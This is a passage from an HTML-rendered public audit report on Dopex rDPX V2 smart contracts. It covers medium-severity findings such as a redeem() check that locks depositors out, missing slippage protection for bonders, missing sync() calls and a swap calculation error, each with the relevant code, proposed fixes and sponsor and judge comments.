3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following steps will reproduce the issue:</p>\n<ol>\n<li>Depositors <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135\"><code>deposit()</code></a> <code>100_000e18</code> WETH to <code>VaultLP</code>.</li>\n<li><code>RdpxV2Core</code> purchased so many options (since so many users were bonding) that it locked up all <code>100_000e18</code> WETH collateral as backing for all the options.</li>\n<li>RDPX price dropped so much that all the Put Options had to be <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L347-L357\"><code>settled()</code></a> to bring dpxETH peg back up. This replaces all the <code>100_000e18</code> WETH with RDPX.</li>\n<li>Since total WETH collateral of <code>VaultLP</code> is now 0, none of the depositors can <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175\"><code>redeem()</code></a> their shares due to this check:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_ASSETS&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The above check will always fail since the computation for <code>assets</code> looks like:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalCollateral</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><code>totalCollateral()</code> will return 0 because there is no WETH collateral left in the <code>VaultLP</code>. So the above computation will be <code>shares * 0 / supply</code> which will always equal 0. So even if the depositor has <code>1_000e18</code> shares and a lot of RDPX they are supposed to be able to withdraw, they will not be able to. In effect, they would lose 100% of their WETH deposited into <code>VaultLP</code> and get zero RDXP in compensation.</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The validation in <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L162\"><code>redeem()</code></a> can be replaced with the following:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">) != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_ASSETS&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>That way, as long as there is any amount of RDPX or WETH they can withdraw, they will be able to do so.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/750#issuecomment-1733740622\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Modify <code>require</code> in the <code>redeem</code> function.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/750#issuecomment-1753147155\">Alex the Entreprenerd (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The finding is valid in that 0 weth will revert.</p>\n<p>But the scenario seems to be extreme, thinking Med due to reliance on external condition.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-no-slippage-protection-for-bonders\" style=\"position:relative;\"><a href=\"#m-14-no-slippage-protection-for-bonders\" aria-label=\"m 14 no slippage protection for bonders permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/598\">[M-14] No slippage protection for bonders</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/598\">dirk_y</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2033\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1647\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1375\">Brenzee</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/790\">T1MOH</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L894-L913\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L894-L913</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1165\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1165</a></p>\n<p>When a user calls <code>bond</code> or <code>bondWithDelegate</code> they specify the amount of DpxEth they want to bond for. As part of this call the cost of the bond (in WETH and rDPX) is calculated. The discount provided for a bond depends on the bond discount factor and the amount of rDPX in the reserve. The bond discount factor should remain relatively static since it is modified only by the admin, but the amount of rDPX in the reserve is constantly fluctuating.</p>\n<p>This is therefore a problem, because the discount at the time where the users tries to bond might be different from the actual discount when the transaction is included in a block since the rDPX in the reserve may have changed. Therefore the bonder will end up paying more WETH and/or rDPX for the given amount of bonds than expected.</p>\n<p>Since the bonders are still receiving a discount I have lowered the severity of this report from “high” to “medium”, however I still consider this a bug because a bonder might expect/require a certain discount in order to make their whole trading strategy profitable.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>For the sake of this report, let’s focus on the normal <code>bond</code> path:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function bond(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 rdpxBondId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _to</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public returns (uint256 receiptTokenAmount) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _whenNotPaused();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Validate amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _validate(_amount &gt; 0, 4);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Compute the bond cost</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      rdpxBondId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC20WithBurn(weth).safeTransferFrom(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      wethRequired</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span></code></pre>\n<p>When calling <code>bond</code>, the amount of bond to mint is specified, and the cost of those bonds is then calculated with a call to <code>calculateBondCost</code> and the WETH transferred from the user (the rDPX is also transferred later). As you can see, there is no way for the user to specify the maximum amount of rDPX or WETH that they want to spend to purchase the bonds.</p>\n<p>Now, let’s have a look at the first part of the discount calculation logic:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function calculateBondCost(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _rdpxBondId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 rdpxPrice = getRdpxPrice();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_rdpxBondId == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 bondDiscount = (bondDiscountFactor *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        1e2) / (Math.sqrt(1e18)); // 1e8 precision</span></span></code></pre>\n<p>As you can see, <code>bondDiscount</code> varies with <code>bondDiscountFactor</code> and the amount of rDPX in the reserve. Since the user has no control over the rDPX in the reserve, it is possible that this can change from block to block, thereby changing the discount and therefore the WETH &#x26; rDPX spent by the user.</p>\n<p>This is now a classic “lack of slippage protection” bug that should be resolved as discussed below.</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>bond</code> and <code>bondWithDelegate</code> should include an additional slippage argument to cap the amount of either WETH or rDPX that they want to spend. Since the ratio of rDPX to WETH is fixed you technically need only a <code>maxAmount</code> for one of these; I would suggest <code>maxRDPX</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1734117439\">witherblock (Dopex) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Avoided via adding slippage protection via token approvals, demoting to QA.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1772398594\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>While the mitigation suggested by the Sponsor is technically correct, I don’t believe we can reasonably expect end users to use their allowance as a way to express pricing. This is due to the fact that such an operation would not be atomical.</p>\n<p>With the information I have available, I believe it is reasonable to say that the execution price is not guaranteed, and since there seems to be a reasonable expectation that no router would be used, the code can cause a leak of value to the caller.</p>\n<p>Leading me to believe that Medium Severity is most appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1777718475\">psytama (Dopex) commented</a>:</strong></p>\n<blockquote>\n<p>As mentioned before this can be mitigated via approval checks and will be added to the UI to allow users to know the max cost they would pay for a bond.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-sync-function-in-rdpxv2coresol-should-be-called-in-multiple-scenarios-to-account-for-the-balance-changes-that-occurs\" style=\"position:relative;\"><a href=\"#m-15-sync-function-in-rdpxv2coresol-should-be-called-in-multiple-scenarios-to-account-for-the-balance-changes-that-occurs\" aria-label=\"m 15 sync function in rdpxv2coresol should be called in multiple scenarios to account for the balance changes that occurs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/269\">[M-15] <code>sync</code> function in <code>RdpxV2Core.sol</code> should be called in multiple scenarios to account for the balance changes that occurs</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/269\">Vagner</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2231\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2227\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2226\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2038\">savi0ur</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2025\">codegpt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2013\">KmanOfficial</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1974\">alexzoid</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1915\">wintermute</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1867\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1775\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1676\">Evo</a>, ak1 (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1510\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1459\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1365\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1183\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1155\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/966\">qbs</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/952\">hals</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/937\">said</a>, ladboy233 (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/934\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/931\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/833\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/798\">peakbolt</a>, 0xnev (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/634\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/631\">2</a>), zaevlad (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/545\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/526\">2</a>), ABAIKUNANBAEV (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/538\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/513\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/440\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/418\">zzebra83</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/384\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/250\">Yanchuan</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/447\">tapir</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L160-L178\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L160-L178</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133</a></p>\n<p>The function <code>sync</code> is used in <code>RdpxV2Core.sol</code> to synchronize the balances of the reserve assets stored in the contract, but it is not called in all of the situations where swaps/providing/removing liquidity is made.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As you can see <code>sync</code> is called in <code>UniV3LiquidityAmo.sol</code> after <code>_sendTokensToRdpxV2Core</code> is called to occur for all of the balances change after modifying the liquidity in UniswapV3 <br><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L361\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L361</a><br>\nBut it is not called functions like <code>collectFees</code> where funds are directly transferred to <code>RdpxV2Core.sol</code> <br><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133</a><br>\nOr in <code>_sendTokensToRdpxV2Core</code> in the <code>UniV2LiquidityAmo.sol</code> which transfers tokens to <code>RdpxV2Core</code> <br><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L157-L178\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L157-L178</a><br>\nBecause of that wrong assumptions can be taken in cases of <code>lowerDepeg</code> or <code>upperDepeg</code>, or any other functions that uses the balances of assets stored, if <code>sync</code> was not called before.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Since you already call <code>sync</code> in <code>_sendTokensToRdpxV2Core</code> from <code>UniV3LiquidityAmo.sol</code>, call it in <code>collectFees</code> and <code>_sendTokensToRdpxV2Core</code> from <code>UniV2LiquidityAmo.sol</code> also to accounts for any balance changes, which will protect the protocol against errors.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1712408116\">bytes032 (Lookout) commented</a>:</strong></p>\n<blockquote>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L361\">This is related to Uni V2, in the implementation for V3 it is called.</a></li>\n<li>This will cause less than expected backing reserves, which can lead to underflow when performing various other actions such as when providing funding for APP options (provideFunding()), settling options (settle()).</li>\n<li>The <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1135\">function getReserveTokenInfo</a> is no longer a reliable source for external integration to retrieve the token balance state.</li>\n</ul>\n<p>Potentially impacts the following functions:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L486\">_purchaseOptions</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L570\">_stake</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L780\">settle</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L803\">provideFunding</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1106\">lowerDepeg</a></li>\n</ul>\n<p>Edit: It’s actually not called in <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/934\">collectFee’s</a> as well. I’m duplicating all of these under a single primary issue, because #269 mentions both.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1734174462\">witherblock (Dopex) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1759127851\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Seems like an opportunity for a higher exploit was missed by stopping at the broken sync.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-inaccurate-swap-amount-calculation-in-relp-leads-to-stuck-tokens-and-lost-liquidity\" style=\"position:relative;\"><a href=\"#m-16-inaccurate-swap-amount-calculation-in-relp-leads-to-stuck-tokens-and-lost-liquidity\" aria-label=\"m 16 inaccurate swap amount calculation in relp leads to stuck tokens and lost liquidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/153\">[M-16] Inaccurate swap amount calculation in ReLP leads to stuck tokens and lost liquidity</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/153\">degensec</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2036\">KmanOfficial</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1860\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1582\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1470\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1418\">nirlin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1347\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1316\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1286\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1279\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1143\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1140\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1101\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/793\">WoolCentaur</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/787\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/772\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/627\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/536\">T1MOH</a>, <a 